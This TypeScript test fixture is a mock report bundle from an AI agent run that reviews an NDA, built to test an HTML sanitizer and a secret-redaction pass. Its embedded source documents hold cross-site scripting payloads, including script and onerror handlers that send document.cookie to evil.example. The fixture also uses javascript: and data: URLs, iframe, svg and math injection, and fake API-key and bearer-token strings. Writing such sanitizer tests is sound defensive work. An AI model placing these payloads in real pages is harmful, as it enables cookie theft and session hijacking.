/**
 * Adversarial run report bundle fixture — real contract shape.
 *
 * Hand-authored against the reference contract documented in
 * `fixtures/reference/CONTRACT.md` (tomsmith8/harvey-run-report,
 * parse_project.py / parse_logs.py / analyze.py / build_report.py).
 *
 * This is the fixture the sanitizer is judged against, so it packs every
 * hostile shape at once:
 *   - `<script>`, `onerror`, a `javascript:` href, `target="_blank"`, inline `style`
 *   - a FULL-DOCUMENT `source_docs[].html` (doctype/html/head/body), which is
 *     what the .docx/.eml/.xlsx converters actually emit — not a fragment
 *   - a ```mermaid fence and raw HTML inside `concepts.synthesis.overall_narrative`
 *   - token-shaped strings in `config`, `log_stats`, and `outputs`
 *   - ONE token-shaped string in `agents[].final_answer` (prose) — present
 *     INTENTIONALLY so the redaction-scoping test can assert it survives verbatim
 *     (prose fields must NOT be regex-swept for token shapes)
 *   - a trace evidence field nested MORE THAN TEN levels deep, which is exactly
 *     where the old depth > 10 redaction bailout used to give up
 *   - both timestamp forms: "YYYY-MM-DD HH:MM:SS.mmm" and true ISO8601 with offset
 *
 * Key shape changes vs. the old fixture:
 *   - NO `page_data.set_var` — that was an internal parser variable never emitted
 *   - `branches[]` are plain strings, not objects with {name, start, end, status}
 *   - `health_notes[]` are plain strings, not objects with {level, message}
 *   - `security` is an ARRAY of findings, not a plain object
 *   - rubric verdicts live in `page_data.rubrics[]`, not `analysis.summaries[]`
 *   - `analysis.summaries[]` follow SUMMARY_SCHEMA (agent activity, not verdicts)
 *   - `analysis.traces[]` follow TRACE_SCHEMA (rubric_id, pathway, q_* fields)
 *   - `page_data.config` replaces the old `page_data.set_var`
 *   - `page_data.documents[]` is document metadata (no HTML), not source docs
 */

/** Build a record nested `depth` levels deep with a secret at the bottom. */
function deepNested(depth: number): Record<string, unknown> {
  let node: Record<string, unknown> = {
    evidence:
      "The retriever authenticated with AKIAIOSFODNN7EXAMPLE — this token shape " +
      "must be scrubbed by the trace token-shape pass.",
    authorization: "Bearer sk-live-DEEPLYNESTEDSECRET0123456789",
  };
  for (let i = depth; i > 0; i--) {
    node = { station: `level_${i}`, detail: node };
  }
  return node;
}

export const FULL_BUNDLE = {
  schema_version: 1,
  // Space-separated UTC form — no timezone indicator.
  generated_at: "2026-08-10 14:32:07.418",

  page_data: {
    // config replaces the old set_var. Token-shaped values in this surface
    // MUST be scrubbed by the scoped token-shape pass.
    config: {
      task_slug: "contract-review-nda-01",
      task_goal: "Review the attached NDA and flag unusual indemnity terms.",
      deliverable: "Annotated summary of material risk clauses.",
      run_id: "run-abc123",
      workspace_id: "ws-xyz789",
      graph_base_url: "https://graph.example.internal",
      models: {
        executor: "claude-sonnet-5",
        judge: "claude-sonnet-4-6",
      },
      flags: {
        concepts_enabled: false,
        strict_retrieval: true,
      },
      // Token-shaped values: the scoped pass MUST scrub these.
      apiKey: "sk-ant-api03-EXAMPLEKEYVALUE0123456789abcdef",
      aws_access_key_id: "AKIAIOSFODNN7EXAMPLE",
      swarm_secret_alias: "{{SWARM_SECRET_ALIAS}}",
      started_at: "2026-08-10 14:28:11.002",
      // ISO8601 with offset form — tests the second timestamp parser.
      finished_at: "2026-08-10T14:32:07.418+00:00",
    },

    score: {
      score: 1,
      max_score: 3,
      all_pass: false,
      n_criteria: 3,
      n_passed: 1,
      judge_model: "claude-sonnet-4-6",
      // Space-separated UTC form for scored_at.
      scored_at: "2026-08-10 14:32:05.001",
    },

    // ≥3 rubrics with mixed verdicts: one pass, one fail, one missing verdict.
    rubrics: [
      {
        id: "R1",
        title: "Identifies the indemnity cap",
        match_criteria: "Response names the $2,000,000 aggregate cap in section 8.2.",
        verdict: "pass",
        reasoning:
          "The response correctly identifies the $2,000,000 aggregate liability cap " +
          "in section 8.2 and flags it as unusually low for a software services NDA.",
      },
      {
        id: "R2",
        title: "Flags the unilateral termination clause",
        match_criteria: "Response identifies section 12.4 as unilateral and non-standard.",
        verdict: "fail",
        reasoning:
          "The response does not mention section 12.4 at all. The unilateral " +
          "termination-for-convenience clause was never retrieved into context.",
        // Judge-review keys as emitted by the run_judge_dispute stage
        // (disputes_json entries merged onto rubric rows by the producer).
        flagged: true,
        llm_flag_reason:
          "The judge's verdict may be too strict: section 12.4 is quoted in " +
          "the response's risk table, though never named by number.",
        document_excerpt:
          "…either party may terminate this Agreement for convenience upon " +
          "thirty (30) days' written notice (s. 12.4)…",
      },
      {
        id: "R3",
        title: "Cites the governing law correctly",
        match_criteria: "Response cites New York as governing law.",
        // Intentionally empty verdict — the projector must handle this gracefully.
        verdict: "",
        reasoning:
          "The judge could not confidently assess this criterion due to an " +
          "incomplete draft response. Governing law mention was ambiguous.",
      },
    ],

    // ≥6 timeline entries. Real Harvey runner step names.
    // Steps are UTC space-separated strings as emitted by ts_str() in parse_project.py.
    timeline: [
      { step: "check_documents",      start: "2026-08-10 14:28:11.002", end: "2026-08-10 14:28:29.905", duration_s: 18.903 },
      { step: "call_checklist_llm",   start: "2026-08-10 14:28:29.905", end: "2026-08-10 14:28:44.771", duration_s: 14.866 },
      { step: "run_cross_check_agent",start: "2026-08-10 14:28:44.771", end: "2026-08-10 14:29:41.880", duration_s: 57.109 },
      { step: "run_draft",            start: "2026-08-10 14:30:08.440", end: "2026-08-10 14:31:12.760", duration_s: 64.320 },
      { step: "score_rubric",         start: "2026-08-10 14:31:40.900", end: "2026-08-10 14:32:01.640", duration_s: 20.740 },
      { step: "format_results",       start: "2026-08-10 14:32:01.640", end: "2026-08-10 14:32:04.880", duration_s: 3.240 },
    ],

    // agents[] with at least one pair of overlapping spans (so the Gantt
    // shared-axis rendering has something to prove).
    agents: [
      {
        name: "cross_check_agent",
        step: "run_cross_check_agent",
        start: "2026-08-10 14:28:44.771",
        end: "2026-08-10 14:29:41.880",
        duration_s: 57.109,
        n_messages: 12,
        tools: ["graph_search", "graph_neighbors"],
        // Intentional: one token-shaped string in final_answer (prose).
        // Redaction-scoping tests MUST assert this survives verbatim — prose
        // fields are NOT swept by the regex-based token-shape pass.
        final_answer:
          "Cross-check complete. The registration id AKIAIOSFODNN7EXAMPLE appears " +
          "in the corporate filing exhibit and is a legitimate identifier, not a secret. " +
          "Sections 8.2 and 12.4 were the primary areas of concern.",
        agent_label: "Cross-Check Agent",
        transcript_truncated: false,
      },
      {
        name: "drafter",
        step: "run_draft",
        // Overlaps with a later phase — the Gantt must show this concurrency.
        start: "2026-08-10 14:29:50.000",
        end: "2026-08-10 14:31:12.760",
        duration_s: 82.760,
        n_messages: 8,
        tools: ["graph_get", "graph_search"],
        final_answer:
          "Draft summary produced. The NDA's indemnity cap of $2,000,000 is below " +
          "industry standard. Section 12.4 confers unilateral termination rights to " +
          "the counterparty. Governing law defaults to New York per section 18.",
        agent_label: "Drafting Agent",
        transcript_truncated: false,
      },
    ],

    // documents[] — document metadata only (NOT HTML bodies).
    // Include a url-shaped field so the T2 redaction fix has something to catch.
    documents: [
      {
        file: "mutual-nda-acme-initech-executed.docx",
        project_id: "proj-001",
        strategy: "full_text",
        ref_id: "doc-nda",
        already_exists: true,
        // URL-shaped field — the projector must redact/omit this.
        url: "s3://stakwork-uploads/runs/abc123/mutual-nda-acme-initech-executed.docx",
        start: "2026-08-10 14:28:11.002",
        end: "2026-08-10 14:28:14.320",
      },
      {
        file: "re-nda-redlines-thread.eml",
        project_id: "proj-001",
        strategy: "email_thread",
        ref_id: "doc-email",
        already_exists: false,
        start: "2026-08-10 14:28:14.320",
        end: "2026-08-10 14:28:19.001",
      },
    ],

    // branches[] — plain strings as emitted by the reference generator.
    // NOT objects with {name, start, end, status}.
    branches: [
      "check_nda_complete - then: proceed to analysis, else: request missing exhibits",
      "NOTE: Both NDA parties confirmed as US entities; GDPR scope excluded.",
      "indemnity_cap_standard - then: flag as acceptable, else: flag for negotiation",
      "NOTE: Unilateral termination clause detected — flagged for client review.",
    ],

    // health_notes[] — plain strings. NOT objects with {level, message}.
    health_notes: [
      "Retrieval returned 2 documents below the relevance floor (score < 0.65).",
      "No rate limiting encountered during LLM calls.",
      "Transcript for cross_check_agent was not truncated.",
    ],

    wall_clock_min: 3.94,

    // log_stats — token-shaped string in last_auth_header must be scrubbed.
    log_stats: {
      total_lines: 4821,
      untagged_lines: 217,
      projects: 1,
      noise_projects: 0,
      transcripts_truncated: 0,
      n_transcripts: 2,
      // Another token shape in a log/config surface.
      last_auth_header:
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N",
    },

    // security — ARRAY of findings (NOT a plain object).
    security: [
      {
        kind: "secret_pattern",
        where: "agent_transcript/cross_check_agent",
        count: 1,
        severity: "high",
        detail: "AWS key pattern matched; value redacted before bundle emission.",
      },
      {
        kind: "external_url",
        where: "source_doc/doc-nda",
        count: 2,
        severity: "low",
        detail: "External links detected in converted document; rendered without target=_blank.",
      },
    ],

    outputs: {
      document_path: "s3://stakwork-uploads/runs/abc123/output.docx",
      token_usage: { input: 91_204, output: 8_113 },
      // Token shape in outputs — must be scrubbed.
      signing_key: "sk-ant-api03-OUTPUTSIGNINGKEY0123456789abcdef",
    },
  },

  // ── analysis (bundle-root sibling of page_data, NOT inside page_data) ──────

  analysis: {
    // summaries[] follow SUMMARY_SCHEMA from analyze.py.
    // These are per-agent activity summaries — NOT rubric verdict records.
    summaries: [
      {
        agent_name: "cross_check_agent",
        mission:
          "Verify that critical NDA clauses (indemnity cap, termination, governing law) " +
          "were correctly retrieved and present in the working context.",
        tools: [
          { name: "graph_search", count: 4, purpose: "Semantic search for clause text" },
          { name: "graph_neighbors", count: 2, purpose: "Retrieve adjacent context nodes" },
        ],
        files_touched: [
          { path: "scratch/retrieval-plan.txt", action: "read", note: "Used to confirm retrieval scope" },
        ],
        context_gathered:
          "Retrieved sections 8, 12, and 18 of the NDA. Section 12.4 was partially " +
          "retrieved — only the first of two chunks scored above the relevance floor.",
        key_findings: [
          "Section 8.2 indemnity cap ($2,000,000) successfully retrieved.",
          "Section 12.4 termination clause partially missing from context.",
          "Section 18 governing law (New York) retrieved but ranked low.",
        ],
        anomalies: [
          "Chunk overlap split section 12 across two windows; only one window was scored.",
        ],
        failed_rubric_relevance: [
          { rubric_id: "R2", note: "Section 12.4 was not present in the retrieved context." },
        ],
      },
      {
        agent_name: "drafter",
        mission:
          "Produce a structured summary of risk clauses in the NDA for client review.",
        tools: [
          { name: "graph_get", count: 3, purpose: "Fetch specific clause nodes by id" },
          { name: "graph_search", count: 2, purpose: "Find supporting context for drafting" },
        ],
        files_touched: [
          { path: "scratch/notes.md", action: "read", note: "Referenced chunking notes" },
          { path: "output/draft-summary.txt", action: "write", note: "Primary output artifact" },
        ],
        context_gathered:
          "Worked from the cross-check agent's retrieved context. Noted that section 12.4 " +
          "was absent and flagged it in the draft as requiring manual verification.",
        key_findings: [
          "Indemnity cap is below industry standard ($2M vs typical $5–10M range).",
          "Governing law is New York, confirmed by section 18.",
        ],
        anomalies: [],
        failed_rubric_relevance: [],
      },
    ],

    // traces[] follow TRACE_SCHEMA from analyze.py.
    // ≥2 entries, each with a rubric_id matching page_data.rubrics[].id.
    traces: [
      {
        rubric_id: "R2",
        pathway: [
          {
            station: "ingestion",
            status: "partial",
            evidence:
              "Section 12.4 was split across two chunks during document ingestion. " +
              "Only the first chunk (lines 1–18 of section 12) was indexed with a " +
              "relevance score above the 0.65 floor.",
          },
          {
            station: "retrieval",
            status: "miss",
            // Deeply nested evidence field — must survive redaction past depth 10.
            evidence: deepNested(14),
          },
          {
            station: "draft",
            status: "absent",
            evidence:
              "The drafter's context window did not contain section 12.4; it was " +
              "not included in the draft output.",
          },
          {
            station: "verification",
            status: "not_checked",
            evidence: "Verification agent did not flag the absence of section 12.4.",
          },
        ],
        q_ingested_to_graph: {
          answer: "partial",
          evidence:
            "Section 12.4 text was partially ingested. The second chunk containing " +
            "the full termination-for-convenience language was indexed at 0.61, below " +
            "the retrieval floor.",
        },
        q_knowable_or_derived: {
          answer: "yes",
          evidence:
            "The full text of section 12.4 is in the graph; it was simply not " +
            "retrieved because its relevance score fell below threshold.",
        },
        q_draft_got_it: {
          answer: "no",
          evidence:
            "No mention of section 12.4 or unilateral termination appears in the " +
            "draft output.",
        },
        q_verify_got_it: {
          answer: "no",
          evidence:
            "Verification pass did not catch the omission. The rubric criterion was " +
            "not surfaced for verification.",
        },
        root_cause:
          "Chunk-boundary split during ingestion caused section 12.4 to fall below " +
          "the retrieval relevance floor. The retriever never fetched it.",
        classification: "retrieval_miss",
        fix_suggestions: [
          "Increase chunk overlap for numbered contract sections (from 64 to 256 tokens).",
          "Retrieve whole sections when a heading pattern matches the rubric criterion.",
        ],
      },
      {
        rubric_id: "R3",
        pathway: [
          {
            station: "ingestion",
            status: "ok",
            evidence: "Section 18 (governing law) was fully ingested at relevance score 0.82.",
          },
          {
            station: "retrieval",
            status: "outranked",
            evidence:
              "A boilerplate paragraph referencing Delaware law outranked section 18 " +
              "during the semantic search step. The governing-law clause was retrieved " +
              "fourth and truncated out of the context window.",
          },
          {
            station: "draft",
            status: "wrong",
            evidence:
              "The drafter cited Delaware as governing law, sourced from the boilerplate " +
              "paragraph that outranked the correct section 18.",
          },
          {
            station: "verification",
            status: "not_checked",
            evidence: "Verification did not cross-check the governing-law citation.",
          },
        ],
        q_ingested_to_graph: {
          answer: "yes",
          evidence:
            "Section 18 was ingested with a relevance score of 0.82, well above the floor.",
        },
        q_knowable_or_derived: {
          answer: "yes",
          evidence:
            "The correct governing law (New York, section 18) is in the graph and " +
            "was retrievable.",
        },
        q_draft_got_it: {
          answer: "no",
          evidence:
            "The draft cited Delaware, not New York. The drafter used a boilerplate " +
            "paragraph that appeared first in the ranked results.",
        },
        q_verify_got_it: {
          answer: "no",
          evidence: "The verification agent did not flag the incorrect governing-law citation.",
        },
        root_cause:
          "A boilerplate Delaware-law paragraph outranked the actual section 18 governing-law " +
          "clause in the semantic search, causing the drafter to cite the wrong state.",
        classification: "retrieval_outranked",
        fix_suggestions: [
          "Boost the relevance score of explicitly-numbered sections (e.g. '18. Governing Law').",
          "Add a verification step that cross-checks cited law against the document index.",
        ],
      },
    ],
  },

  // ── concepts (bundle-root sibling, NOT inside page_data) ───────────────────
  // Populated with per_agent + full synthesis object.

  concepts: {
    per_agent: [
      {
        agent_name: "cross_check_agent",
        concepts: ["indemnity", "termination", "governing_law", "retrieval_coverage"],
      },
      {
        agent_name: "drafter",
        concepts: ["indemnity", "governing_law", "risk_summary"],
      },
    ],
    synthesis: {
      // Contains a mermaid fence AND raw HTML. Neither may reach a renderer
      // that would interpret them — this renders as escaped React text.
      overall_narrative:
        "The run failed two rubrics for the same root cause: section-splitting during " +
        "chunking caused critical NDA clauses to fall below the retrieval floor.\n\n" +
        "```mermaid\ngraph TD\n  A[Chunk] --> B[Retrieve]\n  B --> C[Draft]\n  C --> D[Verify]\n```\n\n" +
        "<img src=x onerror=alert(document.cookie)> <script>alert('concepts')</script>\n\n" +
        "Both R2 and R3 failures trace to the same chunking configuration. Increasing " +
        "chunk overlap and adding a governing-law verification step would address both.",
      concept_matrix: [
        {
          concept: "indemnity_cap",
          agents: ["cross_check_agent", "drafter"],
          verdict: "addressed",
          note: "Both agents correctly identified and surfaced the $2M cap.",
        },
        {
          concept: "termination_clause",
          agents: ["cross_check_agent"],
          verdict: "missed",
          note: "Section 12.4 was not retrieved; the drafter never saw it.",
        },
        {
          concept: "governing_law",
          agents: ["cross_check_agent", "drafter"],
          verdict: "wrong",
          note: "Drafter cited Delaware instead of New York due to retrieval outranking.",
        },
      ],
      relation_to_failures: [
        {
          rubric_id: "R2",
          finding:
            "The termination_clause concept was present in the graph but missed " +
            "by retrieval; section 12.4 was never surfaced to any agent.",
        },
        {
          rubric_id: "R3",
          finding:
            "The governing_law concept was retrieved incorrectly; the wrong clause " +
            "outranked the authoritative section 18.",
        },
      ],
      recommendations: [
        "Increase chunk overlap for numbered contract sections from 64 to 256 tokens.",
        "Add explicit heading-pattern boost for section-number prefixes (e.g. '12.', '18.').",
        "Introduce a post-draft governing-law verification step against the document index.",
      ],
    },
  },

  // ── source_docs (bundle-root sibling, NOT inside page_data) ─────────────────
  // HTML source documents. The adversarial HTML fixture must reach the real
  // sanitizer — this is what the pipeline test is judged against.

  source_docs: [
    {
      id: "doc-nda",
      title: "Mutual NDA — Acme / Initech (executed).docx",
      // FULL DOCUMENT as the converters emit: doctype/html/head/body plus every
      // hostile construct we claim to strip.
      html: `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Mutual NDA</title>
  <style>body { background: url('https://tracker.example/beacon.png'); }</style>
  <script>fetch('https://evil.example/exfil?c='+document.cookie)</script>
</head>
<body>
  <h1 id="title" class="doc-title" style="color:#c00">MUTUAL NON-DISCLOSURE AGREEMENT</h1>
  <p>This Agreement is entered into as of <time datetime="2026-03-01">March 1, 2026</time>
     between <strong>Acme Corporation</strong> and <strong>Initech LLC</strong>.</p>

  <img src="x" onerror="fetch('https://evil.example/'+document.cookie)" alt="logo">
  <a href="javascript:alert('xss')" target="_blank">Exhibit A</a>
  <a href="https://courts.example/docket/2024-CV-1187" target="_blank" rel="external">Docket 2024-CV-1187</a>

  <h2>8. Indemnification</h2>
  <p>8.2 Aggregate liability shall not exceed <strong>$2,000,000</strong>.
     Registration no. AKIAIOSFODNN7EXAMPLE appears in the corporate filing and
     must NOT be scrubbed by the token pass.</p>

  <h2>12. Term and Termination</h2>
  <p>12.4 Either party may terminate for convenience on thirty (30) days notice.</p>

  <table>
    <thead><tr><th colspan="2">Schedule of Fees</th></tr></thead>
    <tbody>
      <tr><td colspan="2" onclick="steal()">Combined annual fee</td></tr>
      <tr><td>Year 1</td><td align="right">$45,000</td></tr>
    </tbody>
  </table>

  <svg xmlns="http://www.w3.org/2000/svg"><foreignObject><script>alert('svg')</script></foreignObject></svg>
  <iframe src="https://evil.example/frame"></iframe>
  <math><mtext><script>alert('math')</script></mtext></math>

  <p>Governing law: the laws of the State of <em>New York</em>.</p>
</body>
</html>`,
    },
    {
      id: "doc-email",
      title: "RE: NDA redlines (thread).eml",
      html: `<!doctype html><html><head><title>RE: NDA redlines</title></head><body>
  <blockquote cite="mailto:counsel@initech.example">
    <p>We can live with the cap at $2,000,000 but section 12.4 needs to be mutual.</p>
  </blockquote>
  <p>Sent from a device. <a href="data:text/html,<script>alert(1)</script>">attachment</a></p>
</body></html>`,
    },
  ],

  // ── workfiles (bundle-root sibling, NOT inside page_data) ───────────────────

  workfiles: [
    {
      name: "scratch/retrieval-plan.txt",
      // Angle brackets in plain prose — must render as text, not be swallowed.
      text:
        "Plan: retrieve <section 8>, <section 12>, then compare against rubric R1..R3.\n" +
        "Note key AKIAIOSFODNN7EXAMPLE stays intact here too (not a trace field).",
    },
    {
      name: "scratch/notes.md",
      text: "Chunk overlap currently 64 tokens. Consider 256 for numbered sections.",
    },
  ],

  // ── rubric_links (bundle-root sibling, NOT inside page_data) ────────────────

  rubric_links: {
    R1: [{ doc: "doc-nda", tokens: ["$2,000,000", "Aggregate liability"] }],
    R2: [{ doc: "doc-nda", tokens: ["terminate for convenience", "thirty (30) days"] }],
    R3: [{ doc: "doc-nda", tokens: ["State of New York"] }],
  },
};
